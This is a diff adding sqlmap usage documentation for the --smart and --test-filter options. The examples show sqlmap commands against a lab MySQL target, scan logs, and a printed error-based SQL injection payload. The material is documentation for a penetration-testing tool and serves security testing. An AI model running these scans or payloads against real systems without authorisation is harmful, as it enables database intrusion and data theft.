@@ -1638,6 +1638,75 @@ Example against a Microsoft SQL Server target:
     [11:12:17] [INFO] target URL appears to have 3 columns in query
     [...]
 
+### Conduct through tests only if positive heuristic(s)
+
+Switch `--smart`
+
+There are cases when user has a large list of potential target URLs (e.g. provided with option `-m`) and he wants to find a vulnerable target as fast as possible. If switch `--smart` is used, only parameters with which DBMS error(s) can be provoked, are being used further in scans. Otherwise they are skipped.
+
+Example against a MySQL target:
+
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
+    [...]
+    [16:12:14] [INFO] testing if GET parameter 'ca' is dynamic
+    [16:12:14] [WARNING] GET parameter 'ca' does not appear dynamic
+    [16:12:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
+    [16:12:14] [INFO] skipping GET parameter 'ca'
+    [16:12:14] [INFO] testing if GET parameter 'user' is dynamic
+    [16:12:14] [WARNING] GET parameter 'user' does not appear dynamic
+    [16:12:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
+    [16:12:14] [INFO] skipping GET parameter 'user'
+    [16:12:14] [INFO] testing if GET parameter 'id' is dynamic
+    [16:12:14] [INFO] confirming that GET parameter 'id' is dynamic
+    [16:12:14] [INFO] GET parameter 'id' is dynamic
+    [16:12:14] [WARNING] reflective value(s) found and filtering out
+    [16:12:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [16:12:14] [INFO] testing for SQL injection on GET parameter 'id'
+    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+    do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y
+    [16:12:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+    [16:12:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+    [16:12:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+    [16:12:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
+    [16:12:14] [INFO] testing 'MySQL inline queries'
+    [16:12:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+    [16:12:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+    [16:12:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+    [16:12:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
+    [16:12:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+    [16:12:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
+    [16:12:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [16:12:24] [INFO] target URL appears to have 3 columns in query
+    [16:12:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+    [...]
+
+### Select tests by payloads and/or titles
+
+Option `--test-filter`
+
+In case that you want to filter tests by their payloads and/or titles you can use this option. For example, if you want to test all payloads which have `ROW` keyword inside, you can use `--test-filter=ROW`.
+
+Example against a MySQL target:
+
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --batch --test-filter=ROW
+    [...]
+    [16:16:39] [INFO] GET parameter 'id' is dynamic
+    [16:16:39] [WARNING] reflective value(s) found and filtering out
+    [16:16:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [16:16:39] [INFO] testing for SQL injection on GET parameter 'id'
+    [16:16:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
+    [16:16:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause' injectable 
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    sqlmap identified the following injection points with a total of 3 HTTP(s) requests:
+    ---
+    Place: GET
+    Parameter: id
+        Type: error-based
+        Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause
+        Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (CASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (SELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)
+    ---
+    [...]
+
 ### Simple wizard interface for beginner users
 
 Switch: `--wizard`
